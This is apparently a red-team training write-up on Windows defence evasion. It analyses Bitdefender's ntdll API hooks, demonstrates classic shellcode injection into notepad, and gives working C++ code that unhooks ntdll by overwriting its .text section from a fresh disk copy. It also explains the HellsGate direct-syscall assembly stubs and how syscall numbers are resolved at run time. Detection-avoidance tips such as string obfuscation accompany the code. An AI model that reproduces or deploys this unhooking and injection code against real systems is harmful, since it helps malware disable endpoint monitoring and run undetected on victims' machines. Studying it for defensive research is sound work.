<details>
<summary>01 - Process Unhooking - Introduction</summary>

## Overview

Process unhooking is a critical evasion technique that involves identifying and removing or bypassing API hooks placed by security products within process memory. These hooks allow Endpoint Protection Platforms (EPP) and Endpoint Detection and Response (EDR) systems to monitor and intercept system calls.

## How API Hooking Works

### Normal System Call Flow

In an unhooked system, API calls follow this pattern in ntdll.dll:

```assembly
; Typical syscall structure
mov r10, rcx      ; Store first argument
mov eax, [syscall_number]  ; System call ID
syscall           ; Transition to kernel mode
```

Example from NtCreateFile:
```
mov r10, rcx
mov eax, 55h      ; NtCreateFile syscall number
syscall
ret
```

### Hooked System Call Flow

When security products inject their monitoring DLLs, they modify these functions:

```assembly
; Hooked function example (NtAdjustPrivilegesToken)
jmp  7FFCABAF0080        ; Jump to injected code
```

The jump redirects execution to security product code that:
1. Logs the function call and parameters
2. Performs security checks
3. Potentially blocks malicious activity
4. Eventually calls the original function

## Practical Analysis

### Tools Required
- **Debugger**: x64dbg or WinDbg
- **Process Analysis**: Process Hacker or Process Explorer
- **Memory Analysis**: VMMap or similar tools

### Step-by-Step Hook Identification

#### 1. Attach Debugger to Target Process
```batch
# Attach to notepad.exe
x64dbg -> File -> Attach -> notepad.exe
```

<img width="1614" height="802" alt="image" src="https://github.com/user-attachments/assets/66d7ff5f-ff4d-4f6d-967c-7a732b691216" />


#### 2. Examine System Calls in ntdll.dll
- Navigate to ntdll.dll in memory (Symbols tab -> scroll down to ntdll.dll module -> search: token)
  
  <img width="1611" height="795" alt="image" src="https://github.com/user-attachments/assets/d64226ec-032a-49d7-a713-263c5e35cb4e" />

- Locate critical system calls (NtCreateFile, NtAllocateVirtualMemory, etc.)
- Identify jumps replacing normal syscall instructions

  
<img width="1612" height="798" alt="image" src="https://github.com/user-attachments/assets/70cdd977-b6e6-4441-9d2d-6accbde6fe4a" />


If we go to `NtAdjustPrivilegesToken`:

<img width="1611" height="797" alt="image" src="https://github.com/user-attachments/assets/81b9cd7d-173b-496d-8c54-93b191a1f807" />

<img width="1608" height="791" alt="image" src="https://github.com/user-attachments/assets/e10d9ad1-5268-42e9-8d43-b3e9a0ac1653" />

#### 3. Analyze Hook Code

Follow the jump to injected code:
```assembly
; Example hook trampoline
push rax
mov rax, [security_module_address]
ret
```

<img width="1611" height="793" alt="image" src="https://github.com/user-attachments/assets/8c9b82e5-a112-464d-8b7c-cf71333ec9dc" />


#### 4. Identify Injection Method

**Bitdefender Example:**
- Injected shellcode (4KB memory region)
- Contains Unicode strings referencing AV DLL (add-cuf64.dll)
- Shellcode loads the monitoring DLL into the process
- DLL then sets hooks on ntdll functions

### Memory Analysis with Process Hacker

1. **Locate Injected Regions**:
   - Identify private memory regions with unusual permissions
   - Look for small executable regions (4KB-8KB)
   - Check for DLLs not typically loaded by the process
     
     <img width="1617" height="800" alt="image" src="https://github.com/user-attachments/assets/743cc7ca-e7a2-4d73-9286-d1d81f64823f" />


2. **Examine Loaded Modules**:
   - Identify security product DLLs (e.g., add-cuf64.dll for Bitdefender)

     <img width="1004" height="475" alt="image" src="https://github.com/user-attachments/assets/c6c86f90-4509-4cc0-bba4-55d27978a95b" />

     <img width="1042" height="779" alt="image" src="https://github.com/user-attachments/assets/1a175ea8-95c0-4747-af64-2c29cf1c088c" />

   - Note base addresses and memory protections

### Hook Installation Timeline

1. **Process Creation**: Security product detects new process
2. **Shellcode Injection**: Small shellcode injected into process memory
3. **DLL Loading**: Shellcode loads the full monitoring DLL
4. **Hook Placement**: DLL modifies ntdll function prologues with jumps
5. **Monitoring Active**: All system calls are intercepted and logged


<img width="1614" height="802" alt="image" src="https://github.com/user-attachments/assets/b6315bbb-b61c-453d-8894-bbeed23b56c8" />

So let's take a look at how these hooks are, when these hooks are actually set. So let's reload, and now we see anti-dll is being loaded in a process and you see there is are no hooks here.
     
<img width="1610" height="798" alt="image" src="https://github.com/user-attachments/assets/bf0dd36c-9b71-4f68-9d89-f5f9a6b92456" />

So let's run again. We see kernel32 being loaded, and we have our bitdefender dll (`atcuf64.dll  ). 

<img width="1133" height="904" alt="image" src="https://github.com/user-attachments/assets/63bf6ac3-6c39-40f3-8ad8-0588c72e4e06" />

Let's see if there is any shellcode injected  and there is one at this address with only 4kb:

<img width="1010" height="783" alt="image" src="https://github.com/user-attachments/assets/6a2d2da9-d6db-457a-a118-bcdf0657d416" />

Copy "Base address"

<img width="448" height="309" alt="image" src="https://github.com/user-attachments/assets/2727d31d-f65b-4a9a-88cc-3354564b2cf3" />


CTRL + G:

<img width="762" height="233" alt="image" src="https://github.com/user-attachments/assets/e788de91-1759-4f5e-bf52-0e684a3f243b" />

<img width="1610" height="797" alt="image" src="https://github.com/user-attachments/assets/d3733289-8185-4963-bfe0-ab7084827106" />

It doesn't look like much of a code, so let's see it in a dump and now it makes more sense:

<img width="1611" height="796" alt="image" src="https://github.com/user-attachments/assets/3c642faa-f336-4e7f-94e9-6d26b2f1e6c5" />

We see unicode strings, so atcuf64.dll which is the name of our dll and some path as well. So it looks like that AV when it detects the new process creation, it will inject some shellcode with these strings and probably this shellcode will actually load this dll into the process, and we can actually check that. 

So let's set a breakpoint here for memory access:

<img width="960" height="728" alt="image" src="https://github.com/user-attachments/assets/36aa053d-52c0-4abc-8270-d8b7db770ced" />

Let's run it and we have a hit. Once the AV dll is loaded, this library will set those hooks on anti-dll and other libraries:

<img width="1615" height="800" alt="image" src="https://github.com/user-attachments/assets/a4b53ac1-4a74-4329-a394-c9cde1e3e7ac" />


## Technical Details

### Common Hook Locations
- **ntdll.dll**: Primary target for user-to-kernel transitions
- **kernel32.dll**: Windows API functions
- **advapi32.dll**: Security and registry functions
- **ws2_32.dll**: Network functions

### Hook Implementation Variations

Different security vendors use various techniques:

1. **Direct Function Patching**: Overwriting function prologues with jumps
2. **Export Address Table (EAT) Hooking**: Modifying DLL export tables
3. **Import Address Table (IAT) Hooking**: Modifying import tables of loaded modules
4. **Inline Hooking**: Comprehensive function modification

### Detection Methods

#### Memory Permission Analysis
- Hook code often resides in specially allocated memory regions
- Unusual permission combinations (READ-ONLY + EXECUTE)
- Small, isolated executable regions

#### Code Pattern Recognition
- Look for trampoline code patterns
- Identify jumps to unexpected memory locations
- Detect unusual instruction sequences

## Operational Impact

### Why Unhooking Matters
- **Reduces Detection**: Security products cannot monitor system calls
- **Improves Stealth**: Malicious activity appears as normal process behavior
- **Bypasses Behavioral Analysis**: Evades runtime detection mechanisms

### Limitations and Considerations
- **Privilege Requirements**: Often requires high privileges for memory modification
- **Persistence**: Hooks may be re-applied by security products
- **Detection Risk**: Unhooking attempts may trigger alerts in advanced EDRs

---

</details>


<details>
<summary>02 - Hooks vs Code Injections</summary>

### Step 1: Navigate to the Project Folder
[01.ClassicInjection](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/01.ClassicInjection)

### Step 2: Open and Examine implant.cpp in Notepad++

The code template contains classic injection code:

<img width="1587" height="557" alt="image" src="https://github.com/user-attachments/assets/501cc22d-3941-4767-a028-c4caec379fe1" />

<img width="1154" height="727" alt="image" src="https://github.com/user-attachments/assets/1e167d7b-6fff-420c-8ff2-ef5d0ed007f2" />

Our target is Notepad. We begin by using a function to retrieve its process ID. Once we have the ID, we open a handle to the Notepad process. The payload we are injecting is a simple message box.

<img width="1417" height="767" alt="image" src="https://github.com/user-attachments/assets/b1acae2a-07e1-4b35-900c-7f99227f62c8" />

The injection process works as follows: first, we decrypt the payload `AESDecrypt((char *) payload`. Then, we allocate memory within the Notepad process `VirtualAllocEx`, write our payload into that memory space `WriteProcessMemory`, and finally create a remote thread in Notepad to execute it `CreateRemoteThread`.

### Step 3: Compile the Code
```batch
# Run the compilation batch file exactly as shown via Native Tools Command Prompt for VS
compile.bat
```

**Expected Output**: `implant.exe` is created successfully

<img width="978" height="381" alt="image" src="https://github.com/user-attachments/assets/22b1cf3f-3aee-4b0e-8af8-1004aef5d77b" />

### Step 4: First Test in Excluded Folder

#### Run the injection:
```batch
implant.exe
```

#### Check if injection worked:
1. **Open Process Hacker**
2. **Find notepad.exe process**
3. **Examine Memory tab** - look through memory regions one by one
4. **Locate the payload** in notepad's memory - you'll see the shellcode bytes

   <img width="1367" height="845" alt="image" src="https://github.com/user-attachments/assets/44d78b3c-6278-4b94-a1d2-f604155f1df9" />


**Observation**: The injection into Notepad was completed, but the expected payload (a message box) did not appear. The reason for this is straightforward: we had excluded our shellcode folder from Bitdefender's scans.

<img width="1259" height="798" alt="image" src="https://github.com/user-attachments/assets/e6ad0d32-5e8b-4139-8d5e-7573859feaf1" />

At a process level, this exclusion means that no antivirus hooks were placed on the system calls within our implant. 

<img width="1086" height="709" alt="image" src="https://github.com/user-attachments/assets/7d95c86c-06e7-4099-8241-b1d793c6a6ed" />

To verify this, we modified the code by adding printf("lol\n"); getchar();. The getchar() function pauses the execution, giving us time to attach a debugger before any injection occurs.

<img width="971" height="739" alt="image" src="https://github.com/user-attachments/assets/75c60f1a-329d-4155-9541-b81cbdd4091f" />

#### Debugger Analysis (No Hooks):

```batch
# Start x64dbg
x64dbg

# Attach to implant.exe process
File -> Attach -> Select implant.exe
```

```batch
Options tab -> Preferences -> Untick DLL Load
```
<img width="1619" height="796" alt="image" src="https://github.com/user-attachments/assets/83caa8d6-da67-480a-825f-9428f5d19c1a" />

```batch
# Navigate to ntdll.dll symbols
Symbols tab -> ntdll.dll -> Right-click -> Search -> Token

# Examine system calls like NtAdjustPrivilegesToken
```
<img width="1609" height="793" alt="image" src="https://github.com/user-attachments/assets/91459171-e542-4f6f-bfe1-0d1ac36b6a06" />


```batch
# You'll see normal syscall structure:
mov r10, rcx
mov eax, [syscall_number] 
...
ret

# No jumps to external code - hooks are not present
```
<img width="1609" height="790" alt="image" src="https://github.com/user-attachments/assets/b757a13c-5626-454f-a161-bb33f518ddeb" />


### Step 5: Recompile and Test Again
```batch
# Recompile to ensure clean build
compile.bat

# Run again
implant.exe
```

<img width="1612" height="799" alt="image" src="https://github.com/user-attachments/assets/186a95d8-d2a6-4586-9833-a88e6f558df7" />

**Observation**: Injection works without issues in excluded folder

### Step 6: Create Non-Excluded Test Environment

```batch
# Navigate up one level
cd ..

# Create tests folder
mkdir tests

# Go into tests
cd tests

# Copy the implant file implant.exe and rename it to implant-classic.exe

```

<img width="352" height="179" alt="image" src="https://github.com/user-attachments/assets/95fb4576-828a-46a0-aaae-3292a34926cf" />


### Step 7: Test in Non-Excluded Folder

#### First, start notepad manually:
```batch
notepad.exe
```

#### Attach debugger to notepad to verify hooks:
```batch
x64dbg

# Attach to notepad.exe
File -> Attach -> Select implant-classic.exe
```

<img width="1611" height="796" alt="image" src="https://github.com/user-attachments/assets/be6f7c58-b6a5-44f3-9bff-1f910df7c163" />


```batch
# Navigate to ntdll.dll symbols
Symbols -> ntdll.dll -> Search -> Token -> look for NtAdjustPrivilegesToken

# You'll now see HOOKS:
jmp 7FFCABAF0080
...

# These jumps redirect to AV monitoring code
```
<img width="1132" height="281" alt="image" src="https://github.com/user-attachments/assets/57e2940c-074d-4be1-af39-535f6ac26dfe" />

#### Detach debugger and run the injection:

<img width="1612" height="800" alt="image" src="https://github.com/user-attachments/assets/a0b78683-72fd-4ef1-bee1-fb177639bb8f" />

```batch
# Make sure you're in tests folder
compile.bat
implant.exe
```

### Step 8: Observe Security Product Response

**Immediate Results**:
- `implant.exe` process terminated immediately
- `notepad.exe` process terminated immediately
- After a few seconds: Bitdefender popup appears

**Bitdefender Alert**:
```
Malicious application detected
Threat: implant-classic.exe
Action: Removed
Your device is now safe
```

**File System Impact**:
- The entire `classic-injection` folder is completely removed
- All compiled files and source code deleted by Bitdefender

### Step 9: Analysis of What Happened

#### The Detection Chain:
1. **Hooked NtAllocateVirtualMemory** detected executable memory allocation in another process
2. **Hooked NtWriteVirtualMemory** detected writing to executable memory  
3. **Hooked NtCreateThreadEx** detected remote thread creation
4. **Behavioral analysis** recognized this as classic injection pattern
5. **Automatic response** terminated both processes and deleted files

#### Hook Installation Timeline:
1. **Process Creation**: Bitdefender detected notepad.exe starting
2. **Shellcode Injection**: Bitdefender injected 4KB shellcode into notepad
3. **DLL Loading**: Shellcode loaded `add-cuf64.dll` into notepad
4. **API Hooking**: DLL modified ntdll function prologues with jumps to monitoring code

### Step 10: Key Technical Observations

#### In Excluded Folder:
```assembly
; Normal syscall structure in ntdll
ntdll!NtAllocateVirtualMemory:
mov r10, rcx
mov eax, 18h
syscall
ret
```

#### In Non-Excluded Folder:
```assembly
; Hooked function in ntdll
ntdll!NtAllocateVirtualMemory:
jmp 7FFCABAF0080  ; Jump to Bitdefender code

; The hook code at 7FFCABAF0080:
push rax
mov rax, [Bitdefender_function_table]
call [rax+logging_function]  ; Log the API call
pop rax
; Additional checks...
jmp back_to_original_code
```

### Step 11: Memory Analysis Comparison

#### Excluded Folder Process:
- No unusual DLLs loaded
- No small executable memory regions
- Clean ntdll without modifications

#### Non-Excluded Folder Process:
- `add-cuf64.dll` loaded in process memory
- Small 4KB executable regions (shellcode)
- Modified ntdll functions with jumps

### Step 12: Conclusion and Next Steps

**Problem Identified**: Classic injection is easily detected by security product hooks

**Required Solutions**:
1. **Detect and remove hooks** before performing injection
2. **Use direct system calls** to bypass hooked APIs
3. **Implement alternative injection** techniques that don't match known patterns

---

</details>


<details>
<summary>03 - Process Unhooking Classic Method</summary>

## Overview

The classic unhooking method involves loading a fresh, clean copy of ntdll.dll from disk and using it to overwrite the hooked version in memory. This technique removes security product hooks and restores original system call functionality, allowing successful code injection without detection.

<img width="420" height="210" alt="Project Overview" src="https://github.com/user-attachments/assets/327be859-1517-4667-9f4c-abfbf6cc4855" />

## Implementation

### Core Concept

The technique works by:
1. Loading a fresh, unhooked copy of ntdll.dll from disk
2. Parsing PE headers to locate the .text section containing code
3. Overwriting the hooked ntdll in memory with clean code
4. Performing injection using now-unhooked system calls

### Code Implementation

[02.FreshCopy](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/02.FreshCopy)

#### Main Unhooking Flow

```cpp
// 1. Decrypt ntdll.dll path (obfuscated to avoid detection)
XORcrypt((char *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);

// 2. Open fresh ntdll.dll from disk
hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

// 3. Map file into memory
hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);

// 4. Remove hooks using fresh copy
ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);

// 5. Perform injection with clean syscalls
// ... injection code ...
```

<img width="1614" height="720" alt="Main unhooking flow code" src="https://github.com/user-attachments/assets/23b20f5a-b07b-4e66-8163-254ef8acc3a8" />

#### Unhooking Function

```cpp
/*
    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll 
    and copies over the hooked one
*/
DWORD UnhookNtdll(HMODULE hNtdll, LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
    
    // Find .text section
    for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
                                            ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
            // Change memory protection to writable
            VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                            pImgSectionHead->Misc.VirtualSize,
                            PAGE_EXECUTE_READWRITE,
                            &oldprotect);
            
            // Copy fresh .text section over hooked version
            memcpy((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                   (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                   pImgSectionHead->Misc.VirtualSize);

            // Restore original memory protection
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
                            pImgSectionHead->Misc.VirtualSize,
                            oldprotect,
                            &oldprotect);
            return 0;
        }
    }
    return -1;
}
```

## Step-by-Step Execution

### Step 1: Environment Setup

```batch
# Create test directory
mkdir C:\tests

# Copy and prepare executable
copy implant.exe C:\tests\implant-fc.exe
```

### Step 2: Compile the Code

```batch
# Run compilation script
compile.bat
```

<img width="908" height="272" alt="Compilation output" src="https://github.com/user-attachments/assets/6874a95e-a19e-4b14-a438-b801a1f61df3" />

### Step 3: Initial Execution

```batch
# Start target process
notepad.exe

# Execute unhooking implant
implant-fc.exe
```

**Output**: `Check 1!` - This indicates the fresh ntdll has been mapped but hooks are still present.

<img width="1437" height="373" alt="Initial execution checkpoint" src="https://github.com/user-attachments/assets/068683e4-98d8-47fd-8542-6a632b7bd232" />

### Step 4: Memory Analysis Before Unhooking

At `Check 1`, we can observe two ntdll instances in memory:

- **Original ntdll**: Loaded by OS with security product hooks
- **Fresh ntdll**: Mapped from disk, clean and unhooked

<img width="1607" height="802" alt="Dual ntdll instances in memory" src="https://github.com/user-attachments/assets/dadd5173-6499-4949-b94b-26f78070ec0e" />

<img width="1615" height="804" alt="Fresh ntdll copy details" src="https://github.com/user-attachments/assets/68a828aa-7e86-49fe-b111-ba5901c6bab5" />

### Step 5: Debugger Analysis - Hooks Present

Attaching a debugger before unhooking reveals hooked functions:

<img width="1611" height="799" alt="Debugger attached to process" src="https://github.com/user-attachments/assets/ecf7d6c8-e878-4357-9ce0-297de7a2504d" />

<img width="1610" height="796" alt="Token privileges examination" src="https://github.com/user-attachments/assets/a809126e-1550-4056-98db-d30bffb2b66b" />

```assembly
; Hooked function example
ntdll!NtAdjustPrivilegesToken:
jmp  7FFCABAF0080      ; Jump to AV monitoring code
```

<img width="1609" height="798" alt="Hooked function visible in debugger" src="https://github.com/user-attachments/assets/bd295c02-4295-4169-8101-26c8f572bd9d" />

### Step 6: Execute Unhooking

Press Enter to continue execution. The program reaches `Check 2!` after the unhooking function completes.

<img width="1607" height="790" alt="Post-unhook checkpoint reached" src="https://github.com/user-attachments/assets/25077889-0c45-44a9-8e76-2158b9deed82" />

### Step 7: Verify Hooks Removed

Re-analyze the ntdll module in debugger:

```assembly
; After unhooking - clean syscall structure
ntdll!NtMapViewOfSection:
mov r10, rcx
mov eax, 28h
syscall
ret
```

<img width="1609" height="793" alt="Clean syscall after unhooking" src="https://github.com/user-attachments/assets/e41920e4-d0aa-4f63-b836-528bf43ad7da" />

Search for other system calls to verify all hooks are removed:

<img width="1611" height="796" alt="Searching for system calls" src="https://github.com/user-attachments/assets/8767c049-2c69-47de-930a-8f8837f5de32" />

All system calls in the .text section are now clean and free from hooks:

<img width="1606" height="798" alt="All syscalls clean after unhooking" src="https://github.com/user-attachments/assets/a4f3f140-f427-448d-9a21-d9c4efb73955" />

### Step 8: Successful Injection

With hooks removed, the injection proceeds undetected:

- Shellcode executes successfully in notepad
- No security product intervention
- MessageBox appears confirming successful execution

<img width="677" height="269" alt="Successful shellcode execution" src="https://github.com/user-attachments/assets/de98d663-9453-4c94-8271-08919237511b" />

<img width="1274" height="391" alt="No detection by security products" src="https://github.com/user-attachments/assets/69c9abb2-bd99-4e9e-9f1e-8bd368c65df0" />

<img width="1283" height="722" alt="Final successful execution result" src="https://github.com/user-attachments/assets/729f264a-12ab-4e39-b2a3-930c7e67bacc" />

## Technical Details

### How the Unhooking Works

1. **PE Header Parsing**: Locates the .text section containing executable code
2. **Memory Protection Modification**: Temporarily makes the .text section writable
3. **Code Overwrite**: Replaces hooked code with clean version from disk
4. **Protection Restoration**: Returns memory to original read/execute permissions

### Critical Components

- **String Obfuscation**: ntdll path is XOR encrypted to avoid static detection
- **Dynamic API Resolution**: VirtualProtect address retrieved at runtime
- **PE Structure Navigation**: Manual parsing of DOS and NT headers
- **Memory Management**: Proper protection flag handling

## Advantages

- **Comprehensive**: Removes all hooks from ntdll in one operation
- **Effective**: Completely bypasses user-mode API monitoring
- **Reliable**: Works across different security products using similar hooking methods
- **Reusable**: Can be integrated into various injection techniques

## Limitations

- **Detection Risk**: Memory protection changes may be monitored
- **Process-Specific**: Only affects current process instance
- **OS Version Dependency**: Fresh ntdll must match running OS version
- **File Access**: Requires read access to system32\ntdll.dll

## Detection Avoidance

- Use obfuscated strings for critical function names
- Implement the unhooking early in execution before monitoring is active
- Consider combining with other evasion techniques for layered protection
- Test against multiple security products for compatibility

## Conclusion

The classic unhooking method provides a robust foundation for bypassing user-mode API hooks. By understanding and implementing this technique, you can effectively neutralize security product monitoring and execute code undetected.

This approach demonstrates the fundamental principle that security products rely on hooking critical system functions, and by restoring these functions to their original state, we can operate without interference.

The step-by-step execution with debugger verification ensures that the unhooking process is complete and effective before proceeding with injection operations.

</details>



<details>
<summary>04 - Hooks vs Hells Gate</summary>
  
## Overview

HellsGate is an advanced technique that dynamically resolves system call numbers at runtime, eliminating the need for hardcoded values that change between Windows versions. This method bypasses API hooks by making direct system calls while maintaining compatibility across different Windows releases.

## The Problem: Changing Syscall Numbers

System call numbers change with every Windows release:

| Windows Version | NtCreateThread Syscall Number |
|----------------|------------------------------|
| Windows 7      | 0x4B                         |
| Windows 10 1809| 0x4C                         |
| Windows 10 1903| 0x4E                         |

Hardcoding these values creates maintenance overhead and version dependency.

One way to deal with this problem is to dynamically detect which version of windows our code is running on and then use specific system call numbers for that version. But this requires implementing a lot of redundant code. Smelly and Evansac implemented a technique called HellsGate which tries to resolve these system call numbers dynamically without a need to  hard code them inside your program.

<img width="404" height="286" alt="image" src="https://github.com/user-attachments/assets/b9ae0a8b-bc84-49bd-a837-9dd311f31540" />

[HellsGate PDF Documentation](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/blob/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/03.HellsGate/hells-gate.pdf)


## Implementation Architecture

### Core Components

[01.Unhooks/03.HellsGate](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/03.HellsGate)

#### 1. Assembly Stubs (HellsGate.asm)

Let's examine the code, which has two main and most important components.

The first is `hellsgate.asm`, a file containing two very simple assembly functions. One is named `HellsGate`, and the other is `HellDescent`.

The `HellsGate` function performs a single, specific task: it takes a function parameter stored in the `ECX` register and copies its value into a global variable named `wSystemCall`.

```nasm
.data
	wSystemCall DWORD 000h

.code 
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	HellDescent ENDP
end
```

The second function, `HellDescent`, is essentially a system call stub. When this function is called, it executes the actual system call into the kernel. It does this by using the system call number stored in the global variable that was previously set by `HellsGate`. That is the core functionality of the assembly part.

#### 2. Syscall Table Structure

The second crucial component is the C code `main.c` file. This is slightly more complex, but not overwhelmingly so. The entire HellsGate technique relies on two tables—or, more precisely, one table and two corresponding data structures.

<img width="1609" height="802" alt="image" src="https://github.com/user-attachments/assets/a0b543fb-c0c1-49df-8965-5c807fd5fed1" />

The first structure is called the `VX_TABLE`, which is essentially an array of structures, each of type `VX_TABLE_ENTRY`.

A `VX_TABLE_ENTRY` is composed of three elements:
1.  **pAddress:** A pointer that holds the address of a function.
2.  **Hash (dwHash):** A 64-bit integer that uniquely identifies that function.
3.  **Syscall (wSystemCall):** The number corresponding to the system call for that function.

In this particular implementation, the `VX_TABLE` is populated with information for only four critical system calls:
*   `NtAllocateVirtualMemory`
*   `NtProtectVirtualMemory`
*   `NtCreateThreadEx`
*   `NtWaitForSingleObject`

An important principle to note here is that the HellsGate technique is designed to use functions exclusively from `ntdll.dll`. It intentionally does not rely on any additional DLLs, such as `kernel32.dll` or `user32.dll`, utilizing only `ntdll` to perform its operations.


## Step-by-Step Implementation

<img width="1609" height="803" alt="image" src="https://github.com/user-attachments/assets/cc543526-5f67-44a0-b64a-afe89e8e5603" />

### Step 1: Locate ntdll.dll in Memory

Now, why is this `VX_TABLE` so important? This table holds all the necessary information to call these four `Nt*` functions directly. However, to call them, we must first resolve their corresponding system call numbers.

To find a specific system call number, we must parse the `ntdll.dll` that is loaded in memory. We obtain the address of `ntdll.dll` by utilizing the Process Environment Block (PEB). 

<img width="1601" height="401" alt="image" src="https://github.com/user-attachments/assets/98a4f860-e22f-4971-9788-d105a8e75784" />

The PEB contains a pointer to a doubly linked list called the In-Memory Order Module List, which holds all modules loaded in the process. The first module in this list is the process image itself, and the second is always `ntdll.dll`. By reading from this list, we get the base address of `ntdll.dll` in our process.

### Step 2: Parse PE Headers for Export Directory

The next step is to extract the Export Directory from `ntdll.dll`. This is done with a helper function `GetImageExportDirectory` that simply parses the PE headers to locate and return the export directory.

<img width="1609" height="613" alt="image" src="https://github.com/user-attachments/assets/3db07920-2c8d-4030-b538-ee714e5cee45" />

Once we have the export directory, we are ready to parse `ntdll.dll` and search for the system calls we are interested in.

<img width="1614" height="687" alt="image" src="https://github.com/user-attachments/assets/8dff01fb-1a09-43ab-84a3-368edbc0964e" />

For each of the four functions (e.g., `NtAllocateVirtualMemory`, `NtCreateThreadEx`, `NtProtectVirtualMemory` and `NtWaitForSingleObject`), we store a hash of the function name.  

<img width="1607" height="579" alt="image" src="https://github.com/user-attachments/assets/f6932274-3522-43b0-9dfa-8ff9dfca1c12" />

This implementation uses the `djb2` hash function, created by Daniel J. Bernstein.

<img width="1614" height="709" alt="image" src="https://github.com/user-attachments/assets/5662d21f-815a-463e-a900-f8d9c699f776" />

 <img width="1610" height="496" alt="image" src="https://github.com/user-attachments/assets/4c5aebec-65e1-4406-899f-17a2a4894b7b" />

 ### Step 3: Resolve Function Addresses and Syscall Numbers
 
We then call a function to locate this hash within the `ntdll.dll` export table. This function works by iterating through the Export Address Table in a loop, comparing the hash of each exported function name against the hash we are seeking. When a match is found, the address of that function is stored in our `VX_TABLE_ENTRY` structure.

<img width="1606" height="711" alt="image" src="https://github.com/user-attachments/assets/55675f73-7980-43bb-be1c-53b6f0587c09" />


### Step 4: Extract Syscall Number from Function Stub

The final step is to find the system call number for that function. This is done in a subsequent loop `while (TRUE)` that searches for the specific byte sequence of the system call stub. 
<img width="1610" height="698" alt="image" src="https://github.com/user-attachments/assets/79a0b24a-0f1b-47cd-9210-a4cd8423cf28" />

The critical bytes we look for are:
*   `4C 8B D1`, which translates to the assembly instruction `mov r10, rcx`.
*   `B8`, which is the `mov eax, ...` opcode. The next four bytes after `B8` contain the system call number.
    <img width="1612" height="807" alt="image" src="https://github.com/user-attachments/assets/a30d4015-2a22-42b8-85cc-e7b6685a9b8e" />


When this specific byte signature is found, the two bytes representing the system call number are extracted and stored in the `wSystemCall` element of our structure.

This process is repeated for all four functions. Once the `VX_TABLE` is fully populated, we call the payload function.

### How the Payload Executes

The payload function uses the two assembly functions, `HellsGate` and `HellDescent`, in the following pattern:

1.  To call `NtAllocateVirtualMemory`, we first call `HellsGate` with the system call number as a parameter. This stores the number in a global variable.
2.  Then, we call `HellDescent` with the exact same parameters that the real `NtAllocateVirtualMemory` function takes. Internally, `HellDescent` retrieves the system call number from the global variable and executes the `syscall` instruction.

This two-step combo is used for all subsequent operations:
*   We allocate virtual memory (`NtAllocateVirtualMemory`).
*   We decrypt our payload (the familiar message box shellcode).
*   We copy the decrypted payload, byte by byte, into the newly allocated memory region.
*   We change the memory permissions from `PAGE_READWRITE` to `PAGE_EXECUTE_READ` using `NtProtectVirtualMemory`.
*   Finally, we create a new thread with `NtCreateThreadEx` that runs our payload and use `NtWaitForSingleObject` to wait for it to finish.

It's important to note that this example runs the shellcode within its own process, but the same technique can be used for injection into another process.

## Debugger Analysis

### Setting Up the Debug Environment

The code includes a debug breakpoint for analysis:
```cpp
// Debug breakpoint - remove for production
__debugbreak();
```

<img width="1608" height="717" alt="image" src="https://github.com/user-attachments/assets/7d3caf64-ee65-4a27-8ac6-bcb28c435808" />


### Step-by-Step Debugging

#### 1. Compile and Run

After compiling and running the program under a debugger, it hits the breakpoint. We can then step through the code to observe the `VX_TABLE` being populated.

```batch
cd 03.HellsGate

# building Hell's Gate:
msbuild HellsGate.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"
```
<img width="1246" height="607" alt="image" src="https://github.com/user-attachments/assets/8f1386b5-5a74-4cec-9ee1-b761618e4b2e" />
<img width="1233" height="611" alt="image" src="https://github.com/user-attachments/assets/225c88aa-af11-45fb-b61c-3d45a220efa2" />

 <img width="375" height="231" alt="image" src="https://github.com/user-attachments/assets/5e4be979-261d-4583-8769-a4e9ee071f82" />


#### 2. Debugger Analysis of Hash Resolution

For demonstration, an `int 3` instruction (a hard-coded breakpoint) was added to the code. This requires running the program under a debugger.

<img width="1608" height="795" alt="image" src="https://github.com/user-attachments/assets/d4f101be-573b-4189-8d88-f454c9bbd11a" />

<img width="1611" height="800" alt="image" src="https://github.com/user-attachments/assets/a7e84705-4412-4cdd-8929-a8338e1eda4c" />

<img width="1609" height="802" alt="image" src="https://github.com/user-attachments/assets/1d45ccce-2cc7-4674-8ae3-71ea43e0613e" />

*   Stepping through the `get_vx_table_entry` function for `NtAllocateVirtualMemory`, we see it successfully finds the function address and its system call number, which is `0x18`. This can be verified in the debugger's symbol view for `ntdll.dll`.
